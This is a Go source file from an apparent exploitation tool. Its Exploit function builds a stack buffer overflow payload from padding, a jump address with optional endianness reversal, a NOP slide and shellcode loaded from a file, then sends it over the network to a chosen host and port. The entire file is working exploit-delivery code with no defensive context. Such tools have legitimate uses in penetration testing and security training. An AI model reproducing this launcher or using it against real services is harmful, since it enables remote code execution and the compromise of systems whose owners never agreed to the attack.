package overflow

import (
    "fmt"
    "net"
    "io/ioutil"
)

// the main functionality of the exploit subroutine
func Exploit(host string, port int, offset int, jump string, reverse bool,
        nops int, shell string, pref, suff string) {
    // generate overflow and nopslide
    pad := generateBytes(0x41, offset)
    slide := generateBytes(0x90, nops)

    // check jump address is correct length
    fmt.Println(" > Parsing jump address.")
    if len(jump) != 16 {
        fmt.Printf("\n Error! invalid jump address '%s'\n", jump)
        return
    }

    // decode jump address
    addr, err := parseHex(jump)
    if err != nil {
        fmt.Printf("\n Error! invalid jump address '%s'\n", jump)
        return
    }

    // reverse endianness if specified
    if reverse {
        reverseBytes(addr)
    }

    // read shell
    fmt.Println(" > Reading shellcode.")
    shellBytes, err := ioutil.ReadFile(shell)
    if err != nil {
        fmt.Printf("\n Error! couldn't read file '%s'\n", shell)
        return
    }

    // construct payload (pad + jump + slide + shell)
    data := append(pad, addr...)
    data = append(data, slide...)
    data = append(data, shellBytes...)

    // build payload to send to target
    fmt.Println(" > Building payload.")
    payload := createPayload(data, pref, suff)

    // send payload to target service
    fmt.Printf(" > Sending %d-byte payload.\n", len(payload))
    err = sendPayload(host, port, payload)
    if err != nil {
        fmt.Printf("\n Error! %s\n", err.(*net.OpError).Err)
        return
    }

    // notify user that the payload was successfully delivered
    fmt.Println("\n Success! No errors found.")
}

